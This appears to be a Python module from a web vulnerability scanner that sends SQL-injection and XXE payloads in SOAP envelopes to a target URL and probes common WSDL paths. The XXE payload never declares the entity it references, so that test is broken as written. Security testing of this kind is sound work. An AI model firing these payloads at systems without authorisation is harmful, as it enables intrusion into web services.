"""SOAP/XML web service attacks."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse

SOAP_PAYLOADS = [
    """<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getUser><id>1' OR '1'='1</id></getUser></soap:Body></soap:Envelope>""",
    """<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getUser><id>1</id></getUser><xxe>&xxe;</xxe></soap:Body></soap:Envelope>""",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    for payload in SOAP_PAYLOADS:
        resp = post(url, data=payload, headers={"Content-Type": "text/xml", "SOAPAction": "getUser"})
        if resp.status != 0:
            text = (resp.text or "").lower()
            if any(k in text for k in ["sql", "syntax", "error", "exception", "fault"]):
                findings.append(Finding(
                    id="soap-inj-{}".format(hash(url) & 0xffff),
                    target=parsed.netloc,
                    type="SOAP Injection",
                    severity="high",
                    url=url,
                    parameter="soap body",
                    payload=payload[:60],
                    evidence="SOAP error in response",
                    response_snippet=resp.snippet(300),
                    confidence=0.6,
                ))
                break
    # WSDL discovery
    for path in ["/?wsdl", "/service?wsdl", "/wsdl", "/api?wsdl"]:
        r = get(parsed.scheme + "://" + parsed.netloc + path)
        if r.status == 200 and "wsdl" in (r.text or "").lower():
            findings.append(Finding(
                id="wsdl-{}".format(hash(url) & 0xffff),
                target=parsed.netloc,
                type="WSDL Exposed",
                severity="info",
                url=parsed.scheme + "://" + parsed.netloc + path,
                parameter="path",
                payload=path,
                evidence="WSDL document accessible",
                response_snippet=r.snippet(200),
                confidence=0.9,
            ))
    log_event(parsed.netloc, "soap_scan", {"url": url, "findings": len(findings)})
    return findings
